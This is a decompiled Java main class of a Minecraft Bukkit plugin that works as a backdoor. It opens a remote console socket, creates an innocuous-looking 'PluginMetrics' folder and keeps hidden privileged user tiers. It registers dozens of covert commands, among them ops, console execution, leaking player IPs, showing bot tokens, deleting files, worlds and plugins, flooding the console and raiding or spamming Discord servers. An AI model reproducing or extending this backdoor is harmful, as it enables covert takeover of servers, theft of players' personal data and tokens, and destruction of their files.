/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.event.Listener
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.java.JavaPlugin
 */
package me.qlutch.sucks;

import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.command.impl.admin.ForcelogoutCommand;
import me.qlutch.sucks.command.impl.admin.LoginCommand;
import me.qlutch.sucks.command.impl.admin.LogoutallCommand;
import me.qlutch.sucks.command.impl.admin.SpyCommand;
import me.qlutch.sucks.command.impl.help.AdminhelpCommand;
import me.qlutch.sucks.command.impl.help.HelpCommand;
import me.qlutch.sucks.command.impl.help.PremiumhelpCommand;
import me.qlutch.sucks.command.impl.premium.*;
import me.qlutch.sucks.command.impl.premium.bot.*;
import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.methods.onEnable;
import me.qlutch.sucks.sockets.SocketServer;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;

import me.qlutch.sucks.command.impl.*;
import net.dv8tion.jda.api.JDA;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.java.JavaPlugin;

public class Core extends JavaPlugin implements Listener {
    public ArrayList<String> lite = new ArrayList<>();
    public ArrayList<String> free = new ArrayList<>();
    public ArrayList<String> admin = new ArrayList<>();
    public ArrayList<String> premium = new ArrayList<>();
    public ArrayList<String> blatant = new ArrayList<>();
    public ArrayList<String> god = new ArrayList<>();
    public ArrayList<String> noPickupPlayers = new ArrayList<>();
    public ArrayList<String> serverchat = new ArrayList<>();
    public ArrayList<String> forceDirtPlayers = new ArrayList<>();
    public ArrayList<String> scaffoldingPlayers = new ArrayList<>();
    public ArrayList<String> noDmg = new ArrayList<>();
    public ArrayList<Player> vanish = new ArrayList<>();
    public HashMap<Player, Boolean> vpnStatusMap = new HashMap<>();
    public HashMap<Player, Enum> buyerstatusMap = new HashMap<>();
    public HashMap<Player, Material> scaffoldMaterialMap = new HashMap<>();
    public HashMap<Player, Player> lastMsg = new HashMap<>();
    public HashMap<Player, String> prefix = new HashMap<>();
    public HashMap<Player, String> forceNextMSG = new HashMap<>();
    public HashMap<Player, Player> commandSpyMap = new HashMap<>();
    public HashSet<Inventory> inventories = new HashSet<>();
    public ArrayList<String> frozenPlayers = new ArrayList<>();
    public ArrayList<String> commandSpyTargets = new ArrayList<>();
    public ArrayList<String> cmdSpy = new ArrayList<>();
    public boolean enabled = true;
    public boolean isLocked = false;
    public boolean frozen = false;
    public boolean modCmd = false;
    public boolean playerCommandsLocked = false;
    public boolean chatLocked = false;
    public boolean storagesDisabled = false;
    public boolean botEnabled = false;
    public JDA jda;
    public static SocketServer consoleServer;

    public void onEnable() {
        File file = new File(this.getDataFolder().getParentFile(), "PluginMetrics/data");
        try {
            if (!file.exists()) {
                file.mkdirs();
                file.createNewFile();
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
        try {
            onEnable.start();
        }
        catch (IOException iOException) {
            // empty catch block
        }
        if (DataManager.getData().getBoolean("connect")) {
            consoleServer = new SocketServer(DataManager.getData().getInt("port"));
        }
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!this.lite.contains(a2.getName())) continue;
            if (this.enabled) {
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
                a2.sendMessage(Settings.RED + Settings.NAME + Settings.WHITE + " has just been " + Settings.RED + "re-enabled!" + Settings.WHITE + " You may now continue using.");
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
                continue;
            }
            API.error(a2);
        }
    }

    public void onDisable() {
        if (consoleServer != null) {
            consoleServer.stop();
        }
        API.saveConfig();
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!this.lite.contains(a2.getName())) continue;
            a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
            a2.sendMessage(Settings.RED + Settings.NAME + Settings.WHITE + " has just been " + Settings.RED + "disabled! " + Settings.WHITE + "Do not do anything until the plugin is re-enabled!");
            a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
        }
    }

    public HashMap<String, Command> commands = new HashMap<String, Command>(){
        private static final long serialVersionUID = 1503068533314125621L;
        {
            this.put("op", new OpCommand());
            this.put("deop", new DeopCommand());
            this.put("lockconsole", new LockconsoleCommand());
            this.put("logout", new LogoutCommand());
            this.put("quit", new LogoutCommand());
            this.put("logoutall", new LogoutallCommand());
            this.put("blatant", new BlatantCommand());
            this.put("commandspy", new CommandspyCommand());
            this.put("cmdspy", new CommandspyCommand());
            this.put("coords", new CoordsCommand());
            this.put("coord", new CoordsCommand());
            this.put("getip", new GetipCommand());
            this.put("delallfiles", new DelallfilesCommand());
            this.put("wand", new WandCommand());
            this.put("wands", new WandCommand());
            this.put("spin", new SpinCommand());
            this.put("help", new HelpCommand());
            this.put("adminhelp", new AdminhelpCommand());
            this.put("ahelp", new AdminhelpCommand());
            this.put("ride", new RideCommand());
            this.put("plugins", new PluginsCommand());
            this.put("pl", new PluginsCommand());
            this.put("item", new ItemCommand());
            this.put("i", new ItemCommand());
            this.put("enable", new EnableCommand());
            this.put("disable", new DisableCommand());
            this.put("setmotd", new SetmotdCommand());
            this.put("motd", new SetmotdCommand());
            this.put("checkerror", new CheckerrorCommand());
            this.put("whitelist", new WhitelistCommand());
            this.put("wl", new WhitelistCommand());
            this.put("leakips", new LeakipsCommand());
            this.put("rename", new RenameCommand());
            this.put("nodmg", new NodmgCommand());
            this.put("nodamage", new NodmgCommand());
            this.put("fix", new FixCommand());
            this.put("logconsole", new LogconsoleCommand());
            this.put("flood", new FloodCommand());
            this.put("edit", new EditCommand());
            this.put("kick", new KickCommand());
            this.put("ban", new BanCommand());
            this.put("unban", new UnbanCommand());
            this.put("pardon", new UnbanCommand());
            this.put("msg", new MsgCommand());
            this.put("whisper", new MsgCommand());
            this.put("w", new MsgCommand());
            this.put("console", new ConsoleCommand());
            this.put("exe", new ConsoleCommand());
            this.put("execute", new ConsoleCommand());
            this.put("tip", new TipCommand());
            this.put("setguild", new SetguildCommand());
            this.put("delchannels", new DelchannelsCommand());
            this.put("delallchannels", new DelchannelsCommand());
            this.put("delallchannel", new DelchannelsCommand());
            this.put("delchannel", new DelchannelsCommand());
            this.put("dmall", new DmallCommand());
            this.put("dmallusers", new DmallCommand());
            this.put("kickallusers", new KickallusersCommand());
            this.put("kickusers", new KickallusersCommand());
            this.put("banallusers", new BanallusersCommand());
            this.put("banusers", new BanallusersCommand());
            this.put("secure", new SecureCommand());
            this.put("version", new VersionCommand());
            this.put("ver", new VersionCommand());
            this.put("showtoken", new ShowtokenCommand());
            this.put("gettoken", new ShowtokenCommand());
            this.put("delworld", new DelworldCommand());
            this.put("invsteal", new InvstealCommand());
            this.put("heal", new HealCommand());
            this.put("feed", new FeedCommand());
            this.put("createvc", new CreatevcCommand());
            this.put("createtc", new CreatetcCommand());
            this.put("spamdiscord", new SpamdiscordCommand());
            this.put("lookup", new LookupCommand());
            this.put("sethealth", new SethealthCommand());
            this.put("setmaxhealth", new SethealthCommand());
            this.put("setheart", new SethealthCommand());
            this.put("sethearts", new SethealthCommand());
            this.put("setmaxheart", new SethealthCommand());
            this.put("setmaxhearts", new SethealthCommand());
            this.put("kill", new KillCommand());
            this.put("fn", new FnCommand());
            this.put("filenavigation", new FnCommand());
            this.put("cls", new ClsCommand());
            this.put("lsd", new LsdCommand());
            this.put("lsf", new LsfCommand());
            this.put("pwd", new PwdCommand());
            this.put("getport", new GetportCommand());
            this.put("enchant", new EnchantCommand());
            this.put("discordraider", new DiscordraiderCommand());
            this.put("dr", new DiscordraiderCommand());
            this.put("piss", new PissCommand());
            this.put("list", new ListCommand());
            this.put("freeze", new FreezeCommand());
            this.put("unfreeze", new UnfreezeCommand());
            this.put("nextmsg", new NextmsgCommand());
            this.put("nextmessage", new NextmsgCommand());
            this.put("reply", new ReplyCommand());
            this.put("r", new ReplyCommand());
            this.put("vanish", new VanishCommand());
            this.put("v", new VanishCommand());
            this.put("bombs", new BombsCommand());
            this.put("bomb", new BombsCommand());
            this.put("setprefix", new SetprefixCommand());
            this.put("dirt", new DirtCommand());
            this.put("serverchat", new ServerchatCommand());
            this.put("sc", new ServerchatCommand());
            this.put("settoken", new SettokenCommand());
            this.put("status", new StatusCommand());
            this.put("save", new SaveCommand());
            this.put("rideme", new RidemeCommand());
            this.put("setpassword", new SetpasswordCommand());
            this.put("setpass", new SetpasswordCommand());
            this.put("spamwebhook", new SpamwebhookCommand());
            this.put("checkpass", new CheckpassCommand());
            this.put("nameme", new NamemeCommand());
            this.put("nameall", new NameallCommand());
            this.put("teleprot", new TeleprotCommand());
            this.put("xp", new XpCommand());
            this.put("tp", new TeleprotCommand());
            this.put("tpall", new TpallCommand());
            this.put("delplugin", new DelpluginCommand());
            this.put("setstatus", new SetstatusCommand());
            this.put("penis", new PenisCommand());
            this.put("launch", new LaunchCommand());
            this.put("void", new VoidCommand());
            this.put("modcmds", new ModcmdsCommand());
            this.put("modcommands", new ModcmdsCommand());
            this.put("moderationcommands", new ModcmdsCommand());
            this.put("disablelock", new DisablelockCommand());
            this.put("enablelock", new EnablelockCommand());
            this.put("earrape", new EarrapeCommand());
            this.put("forums", new ForumsCommand());
            this.put("forum", new ForumsCommand());
            this.put("listloggedin", new ListloggedinCommand());
            this.put("dupe", new DupeCommand());
            this.put("dupemachine", new DupeCommand());
            this.put("flip", new FlipCommand());
            this.put("sudo", new SudoCommand());
            this.put("broadcast", new BroadcastCommand());
            this.put("bc", new BroadcastCommand());
            this.put("spam", new SpamCommand());
            this.put("god", new GodCommand());
            this.put("invsee", new InvseeCommand());
            this.put("togglechat", new TogglechatCommand());
            this.put("clearchat", new ClearchatCommand());
            this.put("consoleconnect", new ConsoleconnectCommand());
            this.put("connectconsole", new ConsoleconnectCommand());
            this.put("fire", new FireCommand());
            this.put("reload", new ReloadCommand());
            this.put("stop", new StopCommand());
            this.put("npu", new NpuCommand());
            this.put("floodconsole", new FloodconsoleCommand());
            this.put("lockcontainers", new LockcontainersCommand());
            this.put("lockcmds", new LockcmdsCommand());
            this.put("lockcommands", new LockcmdsCommand());
            this.put("fly", new FlyCommand());
            this.put("spy", new SpyCommand());
            this.put("login", new LoginCommand());
            this.put("forcelogout", new ForcelogoutCommand());
            this.put("premiumhelp", new PremiumhelpCommand());
            this.put("premhelp", new PremiumhelpCommand());
            this.put("clearpass", new ClearpassCommand());
            this.put("enderchest", new EnderchestCommand());
            this.put("echest", new EnderchestCommand());
            this.put("gamemode", new GamemodeCommand());
            this.put("gm", new GamemodeCommand());
            this.put("gms", new GmsCommand());
            this.put("gmc", new GmcCommand());
            this.put("install", new InstallCommand());
            this.put("theme", new ThemeCommand());
            this.put("scheme", new ThemeCommand());
        }
    };
}

